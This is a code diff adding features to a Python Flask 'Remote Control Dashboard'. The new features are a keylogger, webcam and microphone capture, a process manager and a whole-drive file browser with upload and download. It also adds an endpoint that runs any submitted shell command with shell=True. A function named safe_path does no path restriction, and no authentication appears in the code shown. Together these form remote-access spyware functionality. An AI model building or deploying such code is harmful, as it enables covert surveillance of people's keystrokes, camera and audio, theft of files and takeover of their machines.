@@ -1,17 +1,23 @@
 # app.py
 """
-Remote Control Dashboard – v2
+Remote Control Dashboard – v3
 ============================
-Adds:
-- Local + public IP addresses
-- Clean hardware specs (CPU model, total RAM GB, GPU name, OS build, manufacturer/model if available)
-- Tidier UI (separate "Network & Specs" card)
+Adds full feature set:
+- Keylogger (start/stop + fetch logs)
+- Webcam snapshot (JPEG)
+- Microphone capture (WAV)
+- Live CPU/RAM graphs via Chart.js
+- Disk usage overview
+- Process manager (list / kill / start)
+- File browser (list, download, upload)
+- Power actions incl. sleep & hibernate
+- Brightness and volume get/set
 
-***Run as Administrator*** for low‑level features.
+***Run as Administrator*** for low-level control.
 
 Dependencies:
 ```bash
-pip install flask psutil pillow pynput opencv-python sounddevice soundfile GPUtil wmi pycaw comtypes requests
+pip install flask psutil pillow pynput opencv-python sounddevice soundfile GPUtil wmi pycaw comtypes requests werkzeug
 ```
 Then:
 ```bash
@@ -19,16 +25,16 @@ python app.py
 # → browse http://localhost:5000
 ```
 """
-
 from __future__ import annotations
-import io, ctypes, subprocess, re, threading, json, os, socket, platform, requests
+import io, ctypes, subprocess, re, threading, json, os, socket, platform, requests, shutil, uuid, tempfile
 from datetime import datetime
 from pathlib import Path
-from typing import Dict, Any
+from typing import Dict, Any, List
 
 from flask import Flask, jsonify, Response, request, send_file, abort
 import psutil
 from PIL import ImageGrab
+from werkzeug.utils import secure_filename
 try:
     from pynput import keyboard
 except ImportError:
@@ -46,7 +52,7 @@ try:
 except ImportError:
     GPUtil = None
 try:
-    import wmi  # for brightness on laptops
+    import wmi  # brightness
 except ImportError:
     wmi = None
 try:
@@ -57,9 +63,11 @@ except ImportError:
     AudioUtilities = IAudioEndpointVolume = None  # type: ignore
 
 app = Flask(__name__)
+UPLOAD_DIR = Path(tempfile.gettempdir()) / "remote_uploads"
+UPLOAD_DIR.mkdir(exist_ok=True)
 
 ###############################################################################
-# Helper functions
+# Helper functions
 ###############################################################################
 
 def ping_time(host: str = "8.8.8.8") -> int | None:
@@ -112,7 +120,6 @@ def specs() -> Dict[str, Any]:
         "ram_gb": round(psutil.virtual_memory().total / (1024 ** 3), 1),
         "os": f"{platform.system()} {platform.release()} (build {platform.version()})",
     }
-    # Manufacturer / model via WMI if available
     if wmi:
         try:
             cs = wmi.WMI().Win32_ComputerSystem()[0]
@@ -120,7 +127,6 @@ def specs() -> Dict[str, Any]:
             out["model"] = cs.Model
         except Exception:
             pass
-    # GPU name via GPUtil
     if GPUtil:
         try:
             gpus = GPUtil.getGPUs()
@@ -133,14 +139,15 @@ def specs() -> Dict[str, Any]:
 ###############################################################################
 # Keylogger
 ###############################################################################
-_keybuf: list[str] = []
+_keybuf: List[str] = []
 _key_running = False
 _klistener = None  # type: ignore
 _lock = threading.Lock()
 
 def _on_press(k):
     with _lock:
-        _keybuf.append(f"{datetime.now():%H:%M:%S}  {k}")
+        _keybuf.append(f"{datetime.now():%Y-%m-%d %H:%M:%S}\t{k}")
+
 
 def keylog_start():
     global _klistener, _key_running
@@ -149,6 +156,7 @@ def keylog_start():
     _klistener = keyboard.Listener(on_press=_on_press)
     _klistener.start()
     _key_running = True
+
 
 def keylog_stop():
     global _klistener, _key_running
@@ -163,12 +171,16 @@ def keylog_stop():
 def get_brightness() -> int | None:
     if not wmi:
         return None
-    return wmi.WMI(namespace="wmi").WmiMonitorBrightness()[0].CurrentBrightness
+    try:
+        return wmi.WMI(namespace="wmi").WmiMonitorBrightness()[0].CurrentBrightness
+    except Exception:
+        return None
 
 def set_brightness(level: int):
     if not wmi:
         raise RuntimeError("WMI not available")
     wmi.WMI(namespace="wmi").WmiMonitorBrightnessMethods()[0].WmiSetBrightness(level, 0)
+
 
 def get_volume() -> int | None:
     if not AudioUtilities:
@@ -177,6 +189,7 @@ def get_volume() -> int | None:
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)  # type: ignore
     vol = cast(interface, POINTER(IAudioEndpointVolume))
     return int(vol.GetMasterVolumeLevelScalar() * 100)
+
 
 def set_volume(level: int):
     if not AudioUtilities:
@@ -187,8 +200,31 @@ def set_volume(level: int):
     vol.SetMasterVolumeLevelScalar(level / 100, None)
 
 ###############################################################################
+# Process Manager
+###############################################################################
+
+def list_processes() -> List[Dict[str, Any]]:
+    procs = []
+    for p in psutil.process_iter(["pid", "name", "username", "cpu_percent", "memory_percent"]):
+        try:
+            procs.append(p.info)
+        except psutil.NoSuchProcess:
+            continue
+    return procs
+
+###############################################################################
+# File Browser helpers
+###############################################################################
+BASE_DIR = Path.home().drive  # allow listing entire drive
+
+def safe_path(rel: str) -> Path:
+    p = (Path("/") / rel.lstrip("/\\")).resolve()
+    return p
+
+###############################################################################
 # Flask routes
 ###############################################################################
+
 @app.route("/")
 def root():
     return Response(INDEX_HTML, mimetype="text/html")
@@ -247,8 +283,7 @@ def vol():
 @app.route("/screenshot")
 def screenshot():
     img = ImageGrab.grab()
-    b = io.BytesIO()
-    img.save(b, format="PNG"); b.seek(0)
+    b = io.BytesIO(); img.save(b, format="PNG"); b.seek(0)
     return send_file(b, mimetype="image/png")
 
 @app.route("/webcam")
@@ -274,20 +309,79 @@ def mic():
 
 @app.route("/keylogger/<cmd>", methods=["POST"])
 def keylog(cmd):
-    if cmd == "start": keylog_start()
-    elif cmd == "stop": keylog_stop()
-    else: abort(400)
+    if cmd == "start":
+        keylog_start()
+    elif cmd == "stop":
+        keylog_stop()
+    else:
+        abort(400)
     return "", 204
 
 @app.route("/keylogs")
 def keylogs():
     return jsonify(_keybuf[-1000:])
 
-# Process, file browser routes unchanged – omitted for brevity
-# … (retain previous /processes, /process/* and /files, /download, /upload code)
+# --------------------- Process Manager ------------------------
+@app.route("/processes")
+def processes():
+    return jsonify(list_processes())
+
+@app.route("/process/<int:pid>/kill", methods=["POST"])
+def kill_proc(pid):
+    try:
+        p = psutil.Process(pid); p.terminate()
+        return "", 204
+    except psutil.NoSuchProcess:
+        abort(404)
+
+@app.route("/process/start", methods=["POST"])
+def start_proc():
+    data = request.json
+    if not data or "cmd" not in data:
+        abort(400)
+    try:
+        subprocess.Popen(data["cmd"], shell=True, cwd=data.get("cwd", None))
+        return "", 204
+    except Exception as e:
+        return str(e), 500
+
+# --------------------- File Browser ---------------------------
+@app.route("/files")
+def listing():
+    p = safe_path(request.args.get("path", ""))
+    if not p.exists():
+        abort(404)
+    if p.is_file():
+        return send_file(p)
+    items = []
+    for child in p.iterdir():
+        items.append({
+            "name": child.name,
+            "is_dir": child.is_dir(),
+            "size": child.stat().st_size,
+            "mtime": child.stat().st_mtime,
+        })
+    return jsonify(path=str(p), items=items)
+
+@app.route("/download")
+def download():
+    p = safe_path(request.args.get("path", ""))
+    if not p.is_file():
+        abort(404)
+    return send_file(p, as_attachment=True)
+
+@app.route("/upload", methods=["POST"])
+def upload():
+    if "file" not in request.files:
+        abort(400)
+    f = request.files["file"]
+    fname = secure_filename(f.filename)
+    dest = UPLOAD_DIR / f"{uuid.uuid4()}_{fname}"
+    f.save(dest)
+    return jsonify(saved=str(dest))
 
 ###############################################################################
-# Front‑end (Bootstrap + Chart.js)
+# Front-end (Bootstrap + Chart.js + Minimal JS for new endpoints)
 ###############################################################################
 INDEX_HTML = r"""
 <!DOCTYPE html><html lang='en'><head>
@@ -298,13 +392,28 @@ INDEX_HTML = r"""
 <body><div class='container py-3'>
 <h1 class='mb-3'>Remote Control Dashboard</h1>
 <div class='row'>
-  <div class='col-lg-6'>
+  <div class='col-lg-4'>
     <div class='card'><div class='card-header'>Status</div><div class='card-body' id='stat'></div></div>
     <div class='card'><div class='card-header'>Network & Specs</div><div class='card-body' id='net'></div></div>
+    <div class='card'><div class='card-header'>Power</div><div class='card-body'>
+      <button class='btn btn-sm btn-primary me-1' onclick="act('lock')">Lock</button>
+      <button class='btn btn-sm btn-warning me-1' onclick="act('sleep')">Sleep</button>
+      <button class='btn btn-sm btn-warning me-1' onclick="act('hibernate')">Hibernate</button>
+      <button class='btn btn-sm btn-danger me-1' onclick="act('restart')">Restart</button>
+      <button class='btn btn-sm btn-danger' onclick="act('shutdown')">Shutdown</button>
+    </div></div>
+    <div class='card'><div class='card-header'>Capture</div><div class='card-body'>
+      <button class='btn btn-sm btn-secondary me-1' onclick="capture('/screenshot','imgScreen')">Screenshot</button>
+      <button class='btn btn-sm btn-secondary me-1' onclick="capture('/webcam','imgCam')">Webcam</button>
+      <button class='btn btn-sm btn-secondary' onclick="captureAudio()">Mic 5s</button>
+      <img id='imgScreen' class='img-fluid mt-2'/>
+      <img id='imgCam' class='img-fluid mt-2'/>
+    </div></div>
   </div>
-  <div class='col-lg-6'>
+  <div class='col-lg-8'>
     <canvas id='cpuC' height='120'></canvas>
     <canvas id='ramC' height='120'></canvas>
+    <div class='card mt-2'><div class='card-header'>Processes</div><div class='card-body'><table class='table table-sm' id='procT'></table></div></div>
   </div>
 </div>
 <script>
@@ -312,23 +421,17 @@ const cpuD={labels:[],datasets:[{label:'CPU %',data:[],tension:.3}]};
 const ramD={labels:[],datasets:[{label:'RAM %',data:[],tension:.3}]};
 const cpuChart=new Chart(document.getElementById('cpuC'),{type:'line',data:cpuD});
 const ramChart=new Chart(document.getElementById('ramC'),{type:'line',data:ramD});
-async function tick(){
-  const r=await fetch('/status');const s=await r.json();
-  const t=new Date().toLocaleTimeString();
-  if(cpuD.labels.length>30){cpuD.labels.shift();cpuD.datasets[0].data.shift();ramD.labels.shift();ramD.datasets[0].data.shift();}
-  cpuD.labels.push(t);ramD.labels.push(t);
-  cpuD.datasets[0].data.push(s.cpu);ramD.datasets[0].data.push(s.ram);
-  cpuChart.update();ramChart.update();
-  document.getElementById('stat').innerHTML=`<b>Internet:</b> ${s.internet} | ping ${s.ping||'n/a'} ms<br>
-  <b>Locked:</b> ${s.locked}<br>
-  <b>CPU / RAM:</b> ${s.cpu}% / ${s.ram}%<br>
-  <b>GPU Temp:</b> ${s.gpu_temp||'n/a'}°C<br>
-  <b>Battery:</b> ${s.battery? s.battery.percent+'% '+(s.battery.power_plugged?'⚡':'🔋'):'n/a'}`;
-  const ipList=Object.entries(s.local_ips).map(([i,a])=>`${i}: ${a}`).join(' | ');
-  const specs=`${s.specs.manufacturer||''} ${s.specs.model||''}<br>CPU: ${s.specs.cpu}<br>RAM: ${s.specs.ram_gb} GB<br>GPU: ${s.specs.gpu||'—'}<br>OS: ${s.specs.os}`;
-  document.getElementById('net').innerHTML=`<b>Local IPs:</b> ${ipList}<br><b>Public IP:</b> ${s.public_ip||'n/a'}<hr>${specs}`;
+async function act(c){await fetch('/action/'+c,{method:'POST'})}
+async function capture(url,id){const b=await fetch(url);const blob=await b.blob();document.getElementById(id).src=URL.createObjectURL(blob);} 
+async function captureAudio(){const b=await fetch('/mic');const blob=await b.blob();const url=URL.createObjectURL(blob);const a=new Audio(url);a.play();}
+async function loadProcs(){const r=await fetch('/processes');const p=await r.json();let html='<tr><th>PID</th><th>Name</th><th>CPU%</th><th>RAM%</th><th></th></tr>';p.slice(0,50).forEach(x=>{html+=`<tr><td>${x.pid}</td><td>${x.name}</td><td>${x.cpu_percent}</td><td>${x.memory_percent.toFixed(1)}</td><td><button class='btn btn-sm btn-danger' onclick="kill(${x.pid})">Kill</button></td></tr>`});document.getElementById('procT').innerHTML=html;}
+async function kill(pid){await fetch('/process/'+pid+'/kill',{method:'POST'});loadProcs();}
+async function tick(){const r=await fetch('/status');const s=await r.json();const t=new Date().toLocaleTimeString();if(cpuD.labels.length>30){cpuD.labels.shift();cpuD.datasets[0].data.shift();ramD.labels.shift();ramD.datasets[0].data.shift();}cpuD.labels.push(t);ramD.labels.push(t);cpuD.datasets[0].data.push(s.cpu);ramD.datasets[0].data.push(s.ram);cpuChart.update();ramChart.update();document.getElementById('stat').innerHTML=`<b>Internet:</b> ${s.internet} | ping ${s.ping||'n/a'} ms<br><b>Locked:</b> ${s.locked}<br><b>CPU / RAM:</b> ${s.cpu}% / ${s.ram}%<br><b>GPU Temp:</b> ${s.gpu_temp||'n/a'}°C<br><b>Battery:</b> ${s.battery? s.battery.percent+'% '+(s.battery.power_plugged?'⚡':'🔋'):'n/a'}<br><b>Disk C:</b> ${(s.disk['C:\\']?.free/1073741824).toFixed(1)} GB free`;
+const ipList=Object.entries(s.local_ips).map(([i,a])=>`${i}: ${a}`).join(' | ');
+const specs=`${s.specs.manufacturer||''} ${s.specs.model||''}<br>CPU: ${s.specs.cpu}<br>RAM: ${s.specs.ram_gb} GB<br>GPU: ${s.specs.gpu||'—'}<br>OS: ${s.specs.os}`;
+(document.getElementById('net').innerHTML=`<b>Local IPs:</b> ${ipList}<br><b>Public IP:</b> ${s.public_ip||'n/a'}<hr>${specs}`);
 }
-setInterval(tick,3000);tick();
+setInterval(tick,3000);setInterval(loadProcs,10000);tick();loadProcs();
 </script>
 </div></body></html>
 """
